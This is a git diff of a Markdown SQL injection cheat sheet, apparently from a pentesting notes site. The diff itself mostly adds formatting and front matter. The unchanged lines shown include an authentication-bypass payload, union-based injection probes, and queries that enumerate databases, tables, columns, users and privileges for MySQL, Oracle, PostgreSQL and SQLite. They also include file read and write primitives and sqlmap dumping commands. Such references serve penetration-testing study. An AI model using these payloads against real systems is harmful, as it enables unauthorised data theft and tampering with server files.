@@ -1,3 +1,7 @@
+---
+layout: default
+---
+
 # SQL INJECTION(SQLi)
 - [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)
 - [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
@@ -61,6 +65,9 @@ Next time an attacker logs in to the application with the admin account, the dat
 ' OR '1'='1;-- -
 ```
 
+* * *
+
+
 # Identifying Variants
 ## MySQL
 ```sql
@@ -86,6 +93,8 @@ AND LENGTHB('foo') = '3'
 ```sql
 AND GLOB('foo*', 'foobar') = 1	
 ```
+
+* * *
 
 # List Databases
 ## MySQL
@@ -116,6 +125,8 @@ SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
 N/A
 ```
 
+* * *
+
 # List Tables
 ## MySQL	
 ```sql
@@ -145,6 +156,8 @@ SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]'
 SELECT tbl_name FROM sqlite_master WHERE type='table'
 ```
 
+* * *
+
 # List Columns
 ## MySQL
 ```sql
@@ -172,6 +185,8 @@ SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]'
 SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')
 ```
 
+* * *
+
 # DB User
 ## MySQL
 ```sql
@@ -180,11 +195,13 @@ SELECT CURRENT_USER()
 SELECT user from mysql.user
 ```
 
+* * *
+
 # User Privileges
 Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
 
 ## Super admin privileges
-The query returns Y, which means YES, indicating superuser privileges. 
+> The query returns Y, which means YES, indicating superuser privileges. 
 
 ### MySQL
 ```sql
@@ -192,12 +209,14 @@ SELECT , super_priv FROM mysql.user WHERE user="user";
 ```
 
 ## Other Privileges
-We can also dump other privileges we have directly from the schema, with the following query:
+> We can also dump other privileges we have directly from the schema, with the following query:
 
 ### MySQL
 ```sql
 SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="user@host";-- -
 ```
+
+* * *
 
 # Files
 First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
@@ -210,9 +229,9 @@ LOAD_FILE('/path/to/file')
 
 To be able to write files to the back-end server using a MySQL database, we require three things:
 
-User with FILE privilege enabled
-MySQL global secure_file_priv variable not enabled
-Write access to the location we want to write to on the back-end server
+* User with FILE privilege enabled
+* MySQL global secure_file_priv variable not enabled
+* Write access to the location we want to write to on the back-end server
 
 
 ### PostgreSQL
@@ -237,9 +256,9 @@ readfile('/path/to/file')
 
 ## Write
 ### MySQL
-There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.
+There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable.
+If secure_file_priv value is empty, meaning that we can read/write files to any location.
 
-And the result shows that the secure_file_priv value is empty, meaning that we can read/write files to any location.
 ```sql
 SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
 ```
@@ -247,7 +266,6 @@ SELECT variable_name, variable_value FROM information_schema.global_variables wh
 ```sql
 SELECT 'contents' INTO OUTFILE '/path/to/file'
 ```
-
 
 ### PostgreSQL
 ```sql
@@ -268,6 +286,8 @@ utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
 ```sql
 SELECT writefile('/path/to/file', column_name) FROM table_name
 ```
+
+* * *
 
 # Union Based
 ## Detect number of columns
@@ -290,8 +310,10 @@ The other method is to attempt a Union injection with a different number of colu
 cn' UNION select 1,2,3;-- -
 ```
 
+* * *
+
 # SQLMap:
-```
+```bash
 sqlmap -r request.req --dbs
 sqlmap -r request.req -D main --tables
 sqlmap -r request.req -D main -T user --columns
